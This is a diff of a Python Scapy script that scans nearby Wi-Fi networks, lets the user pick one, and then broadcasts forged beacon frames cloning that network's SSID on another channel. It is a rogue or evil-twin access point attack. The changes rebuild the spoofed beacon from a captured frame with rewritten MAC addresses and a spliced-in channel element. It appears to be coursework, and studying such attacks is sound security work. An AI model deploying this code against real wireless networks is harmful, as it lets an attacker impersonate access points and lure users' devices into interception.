@@ -12,6 +12,8 @@
 # - https://www.quora.com/How-can-I-use-the-null-terminated-characters-in-a-Python-string
 # - https://stackoverflow.com/questions/26826417/how-can-i-find-with-scapy-wireless-networks-around
 # - https://www.youtube.com/watch?v=zwMsmBsC1GM&t=1117s
+# - https://stackoverflow.com/questions/22670510/wireless-data-packet-capturing-with-help-of-scapy
+# - https://stackoverflow.com/questions/29817417/scapy-insert-packet-layer-between-two-other-layers + Edin Mujkanovic
 
 import argparse
 import subprocess
@@ -23,7 +25,6 @@ from scapy.all import *
 
 apList = []
 kill = False
-NUMBER_OF_CHANNEL = 14
 BROADCAST_MAC_ADDRESS = "FF:FF:FF:FF:FF:FF"
 selectedAP = 0
 
@@ -31,7 +32,7 @@ selectedAP = 0
 parser = argparse.ArgumentParser(description="This script is used to detect nearby SSID and display them, and then when the user choose one of the SSID, it create a fake AP by spamming Beacon Frame advertising the same SSID")
 parser.add_argument("-i", "--interface", required=True, help="the interface to use")
 parser.add_argument("-n", "--number", default=0, type=int, help="the number of fake probe response to send")
-parser.add_argument("-s", "--source", default="BB:BB:BB:BB:BB:BB", type=str, help="the source address")
+parser.add_argument("-s", "--source", type=str, help="the source address")
 parser.add_argument("-d", "--destination", default=BROADCAST_MAC_ADDRESS, type=str, help="the destination address")
 
 arguments = parser.parse_args()
@@ -49,8 +50,21 @@ def displayAPList(stdscr, selectedAP):
 
     for element in apList:
         apName = element.info.decode()
+        # Source: https://www.quora.com/How-can-I-use-the-null-terminated-characters-in-a-Python-string
+        # Some people were having strange SSID name so we get rid of all special char (\x00, etc...)
+        apName = apName.rstrip("\x00\n")
 
-        textToDisplay = str(apList.index(element) + 1) + ") " + apName + " - CH " + str(ord(element[Dot11Elt][2].info)) + "  " + str(element.dBm_AntSignal) + " dBm"
+        if(apName == ""):
+            apName = "Hidden SSID"
+        
+        try:
+            channel = str(ord(element[Dot11Elt][2].info))
+            signal = str(element.dBm_AntSignal)
+        except:
+            channel = "Unknown"
+            signal = "Unknown"
+
+        textToDisplay = str(apList.index(element) + 1) + ") " + apName + " - CH " + channel + "  " + signal + " dBm"
 
         if(apList.index(element) == selectedAP):
             stdscr.attron(curses.color_pair(1))
@@ -62,20 +76,6 @@ def displayAPList(stdscr, selectedAP):
         i += 1
 
     stdscr.refresh()
-
-# This function is threaded, and is used to launch 'iwconfig' in order to change the channel of the card, each second.
-def channelChange():
-    i = 1
-
-    while(True):
-        if(kill):
-            break
-        
-        time.sleep(1)
-        cmd = "sudo iwconfig wlan0mon channel " + str(i)
-        process = subprocess.Popen(cmd.split())
-
-        i = i % 13 + 1
 
 # We use a nested function in order to pass argument to the sniff() callback function, source: https://gist.github.com/thepacketgeek/6876699
 def packetHandling(stdscr):
@@ -95,28 +95,22 @@ def packetHandling(stdscr):
             fakeProbe(selectedAP + 1, stdscr)
 
         # We want to gather only BeaconFrame (type Management: 0 and sub type BeaconFrame: 8)
-        if(packet.type == 0 and packet.subtype == 8):
-            apName = packet.info.decode()
-            # Source: https://www.quora.com/How-can-I-use-the-null-terminated-characters-in-a-Python-string
-            # Some people were having strange SSID name so we get rid of all special char (\x00, etc...)
-            apName = apName.rstrip("\x00")
+        if(packet.haslayer(Dot11Beacon)):
+            if(packet.type == 0 and packet.subtype == 8):
+                found = False
 
-            if(apName == ""):
-                apName = "Hidden SSID"
+                # Searching if the AP is already in the list
+                for p in apList:
+                    if(p.info.decode() == packet.info.decode()):
+                        found = True
+                        break
+                
+                if(not found):
+                    apList.append(packet)
+                    # Source: https://stackoverflow.com/questions/26826417/how-can-i-find-with-scapy-wireless-networks-around
 
-            found = False
+                displayAPList(stdscr, selectedAP)
 
-            # Searching if the AP is already in the list
-            for p in apList:
-                if(p.info.decode() == packet.info.decode()):
-                    found = True
-                    break
-            
-            if(not found):
-                apList.append(packet)
-                # Source: https://stackoverflow.com/questions/26826417/how-can-i-find-with-scapy-wireless-networks-around
-
-            displayAPList(stdscr, selectedAP)
     return detectSSID
 
 def fakeProbe(apNumber, stdscr):
@@ -131,10 +125,26 @@ def fakeProbe(apNumber, stdscr):
 
     # Changing channel to the one of the real AP + 6
     newChannel = ((ord(currentPacket[Dot11Elt][2].info.decode()) + 5) % 13) + 1
-    
+
+    if(arguments.source is None):
+        newAdress = currentPacket.addr2
+    else:
+        newAdress = arguments.source
+
     # Crafting and sending the probe response
-    fakeBeacon= RadioTap() / Dot11(type=0, subtype=8, addr1=arguments.destination,addr2=arguments.source, addr3=arguments.source) / Dot11Beacon() / Dot11Elt(ID= "SSID", info=currentPacket.info.decode()) / Dot11Elt(ID="DSset", info=chr(newChannel))
-    
+    fakeBeacon = currentPacket
+    #fakeBeacon.addr2 = newAdress
+    fakeBeacon.addr2 = "AA:AA:AA:AA:AA:AB"
+    #fakeBeacon.addr3 = newAdress
+    fakeBeacon.addr3 = "AA:AA:AA:AA:AA:AB"
+
+    tmp1 = fakeBeacon.getlayer(6)
+    fakeBeacon.getlayer(4).remove_payload()
+
+    # We are basically splitting the packet, removing the 'DSset' Dot11Elt layer and replacing it with a new crafted one
+    modifiedBeacon = fakeBeacon / Dot11Elt(ID="DSset", info=chr(newChannel)) / tmp1
+    fakeBeacon = modifiedBeacon
+
     stdscr.addstr(0,0,"Sending fake Beacon Frame for SSID " + currentPacket.info.decode())
     stdscr.refresh()
 
@@ -147,10 +157,6 @@ def fakeProbe(apNumber, stdscr):
             sendp(fakeBeacon, iface=arguments.interface, verbose=False)
 
 def main(stdscr):
-    # Launching channel switch thread
-    channelThread = threading.Thread(target=channelChange)
-    channelThread.start()
-
     # Avoid echoing the character typed and avoid delay for displaying things with curses library
     curses.noecho()
     stdscr.nodelay(1)
